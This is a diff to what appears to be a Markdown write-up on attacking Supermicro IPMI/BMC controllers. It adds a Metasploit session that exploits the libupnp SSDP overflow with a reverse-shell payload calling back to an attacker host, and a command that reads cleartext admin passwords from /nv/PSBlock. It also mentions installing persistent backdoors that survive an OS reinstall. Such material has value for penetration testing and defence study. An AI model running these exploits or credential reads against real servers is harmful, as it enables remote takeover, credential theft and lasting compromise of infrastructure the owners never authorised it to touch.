@@ -158,7 +158,6 @@ msf auxiliary(ipmi_dumphashes) > run
 Then if you have unknown hashes you just have to bruteforce them but don't was time doing that if you don't acctualy need a specific account on the system. Just becouse it will be a waste of time with so many critical vulnerabilities.
 
 #### How this works?
-
 In short, the authentication process for IPMI 2.0 mandates that the server send a salted SHA1 or MD5 hash of the requested user's password to the client, prior to the client authenticating. 
 
 You heard that right - the BMC will tell you the password hash for any valid user account you request. 
@@ -202,12 +201,42 @@ Server: Access granted!
 Crazy enough?
 
 ## Supermicro IPMI UPnP Vulnerability (A: Is it going to end now?)
-tbc
-## Supermicro IPMI Clear-text Passwords (B: No)
-tbc
+The interesting thing about this attack is that it yields complete root access to the BMC, something that is otherwise difficult to obtain. Keep in mind than an attacker with administrative access, either over the network or from a root shell on the host system, can downgrade the firmware of a Supermicro BMC to a vulnerable version and then exploit it. Once root access is obtained, it is possible to read cleartext credentials from the file system, install additional software, and integrate permanent backdoors into the BMC that would survive a full reinstall of the host's operating system.
 
-### What is broken?
-### IPMI for sure is!
+#### Exploit in Metasploit
+```
+$ msfconsole
+ 
+      =[ metasploit v4.7.0-dev [core:4.7 api:1.0]
++ -- --=[ 1119 exploits - 638 auxiliary - 179 post
++ -- --=[ 309 payloads - 30 encoders - 8 nops
+ 
+msf> use exploit/multi/upnp/libupnp_ssdp_overflow 
+msf exploit(libupnp_ssdp_overflow) > set RHOST 10.0.0.98
+msf exploit(libupnp_ssdp_overflow) > set LHOST 10.0.0.55 
+msf exploit(libupnp_ssdp_overflow) > set PAYLOAD cmd/unix/reverse_openssl 
+msf exploit(libupnp_ssdp_overflow) > exploit 
+ 
+[*] Started reverse double handler
+[*] Exploiting 10.0.0.98 with target 'Supermicro Onboard IPMI (X9SCL/X9SCM) Intel SDK 1.3.1' with 2106 bytes to port 1900...
+[+] Sending payload of 182 bytes to 10.0.0.98:4259...
+[*] Command shell session 1 opened (10.0.0.55:4444 -> 10.0.0.98:3688) at 2013-06-24 13:35:24 -0500
+[*] Shutting down payload stager listener...
+ 
+uname -a
+Linux (none) 2.6.17.WB_WPCM450.1.3 #1 Wed Nov 14 10:33:10 PST 2012 armv5tejl unknown
+```
+
+## Supermicro IPMI Clear-text Passwords (B: No)
+I already have access to the system (maybe an unprivileged user) and I want to get more access.
+
+```
+$ cat /nv/PSBlock
+  admin                      ADMINpassword^TT                    rootOtherPassword!
+```
+
+#### What is broken?
+#### IPMI for sure is!
 
 # But what is the big deal?
 Just wait for it ... to be continued.
